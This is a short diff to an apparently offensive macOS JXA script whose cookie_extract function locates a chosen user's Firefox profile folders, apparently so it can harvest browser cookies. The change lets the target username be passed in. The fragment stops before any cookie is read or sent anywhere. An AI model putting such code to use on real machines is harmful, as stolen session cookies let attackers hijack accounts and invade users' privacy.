@@ -3,12 +3,11 @@ ObjC.import('Foundation');
 app = Application.currentApplication();
 app.includeStandardAdditions = true;
 
-function cookie_extract(){
+function cookie_extract({user = $.NSUserName().js} = {}){
 var output = "";
 var fileMan = $.NSFileManager.defaultManager;
 var err;
-var username = $.NSUserName().js
-var ffoxpath = '/Users/' + username + '/Library/Application\ Support/Firefox/Profiles';
+var ffoxpath = '/Users/' + user + '/Library/Application\ Support/Firefox/Profiles';
 if (fileMan.fileExistsAtPath(ffoxpath)){
 	let prof_folders = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ffoxpath,$()));
 	try{
